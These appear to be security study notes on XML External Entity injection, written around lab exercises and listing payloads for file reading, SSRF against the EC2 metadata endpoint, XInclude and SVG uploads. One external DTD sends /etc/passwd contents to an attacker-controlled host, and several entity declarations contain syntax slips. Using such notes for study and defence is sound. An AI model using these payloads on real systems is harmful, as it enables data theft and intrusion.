# XML External Entity (XXE) Injection

`% xxe` -> parameter entity and invoked only with the DTD as `%xxe;`

`xxe` -> external entity and invoked anywhere as `&xxe;`

### How do XXE vulnerabilities arise?

* Applications use the XML format to transmit data between the browser and the server
* XML specification contains dangerous features, and standard parsers support these features

### Exploiting XXE using External Entities to Retrieve Files

* `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`&#x20;

### Exploiting XXE to Perform SSRF attacks

* The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/.&#x20;
* `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>`
* Same URL for every scenario (default IP set for EC2 metadata)

### Blind XXE Vulnerabilities

* **To Exfiltrate Data use 2 Methods**
  * OAST technique using collaborator or similar tools&#x20;
  * By triggering error messages that can contain sensitive data

### **Blind XXE with Out-of-Band Interaction**

* `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http:burpcollaborator"> ]>`&#x20;
* Invoke `&xxe;` in any of the existing data elements or within the XML document

### **Blind XXE with Out-of-Band Interaction via XML Parameter Entities** &#x20;

* `<!DOCTYPE foo [ <!ENTITY % xxe; SYSTEM "http://burpcollaborator" > %xxe; ]>`&#x20;
* Invoke `%xxe;` within the existing DTD if the above method does not work

### **Exploiting Blind XXE to Exfiltrate Data Out-of-Band** <sub>(only if application allows to fetch contents remotely)</sub>

* Create a `malicious.dtd` external DTD file and host it in attacker controlled server to be fetched by victim server
* Payload to be provided in victim application
  * `<!DOCTYPE foo [ % xxe; SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`

<details>

<summary>Malicious.dtd</summary>

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://www.attacker.com/?x=%file; '>">
%eval;
%exfiltrate;
```

</details>

### **Exploiting Blind XXE to Retrieve Data via Error Messages** <sub>(only if application allows to fetch contents remotely)</sub>

* Effective only if the application returns the resulting error message within its response
* Host external DTD `malicious.dtd`&#x20;
* Payload to be provided in victim application&#x20;
  * `<!DOCTYPE foo [ % xxe; SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`
* External DTD is only possible because XML parameter entity can be used within the definition of another parameter entity which is not possible in internal DTD

<details>

<summary>Malicious.dtd</summary>

{% code lineNumbers="true" %}
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
{% endcode %}

</details>

### **Exploiting Blind XXE by Repurposing a Local DTD** <sub>(if remote fetching of DTD file is not allowed)</sub>

* Exploitable if a document's DTD uses hybrid model (ie internal and external DTD declarations)
* The restriction on using an XML parameter entity within the definition of another parameter entity is relaxed
* External DTD that is local to the application server since out-of-band connections are blocked&#x20;

### Locating an Existing DTD File to Repurpose

* Here ISOamso is an external entity that is redefined within the internal DTD to trigger an error message that displays the data

<details>

<summary>Existing Local DTD</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
{% endcode %}

</details>

<details>

<summary>Modified DTD</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
{% endcode %}

</details>

### XInclude attacks

* When client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service
* XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
* Place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document&#x20;
* Below code is added to a normal application that takes parameters in URL-encoded format (eg: productid=1\&storeid=1)
* Input the payload to productid="payload" -- if the backend server parses this as an XML document the payload gets executed (blind)

<details>

<summary>Payload</summary>

{% code lineNumbers="true" %}
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
{% endcode %}

</details>

### XXE Attacks via File Upload

* XML based formats are office document formats like DOCX and image formats like SVG
* If the above extensions are possible, try uploading an SVG image with malicious payload that gets displayed within the application (profile pic etc.)&#x20;
* Store the below payload as SVG file extension and upload -> output will be as the image

<details>

<summary>SVG Payload</summary>

{% code lineNumbers="true" %}
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
        <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
```
{% endcode %}

</details>

### XXE attacks via modified content type

* POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`
* Some web sites expect to receive requests in this format but will tolerate other content types, including XML
* Change the content-type header from `URL-encoded` to `text/xml` and provide the parameters in XML format
* If application accepts the XML format try for XML vulnerability mentioned above
